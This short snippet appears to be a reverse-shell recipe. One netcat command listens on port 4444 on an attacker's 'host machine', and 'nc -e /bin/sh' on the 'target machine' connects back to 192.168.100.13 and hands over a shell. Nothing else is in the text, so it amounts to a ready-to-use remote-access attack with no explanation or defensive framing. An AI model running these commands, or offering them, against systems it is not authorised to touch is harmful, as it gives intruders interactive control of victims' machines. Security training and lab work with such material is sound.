# On host machine
nc -lnvp 4444

# On target machine
export PATH=$PATH:/tmp
nc -e /bin/sh 192.168.100.13 4444
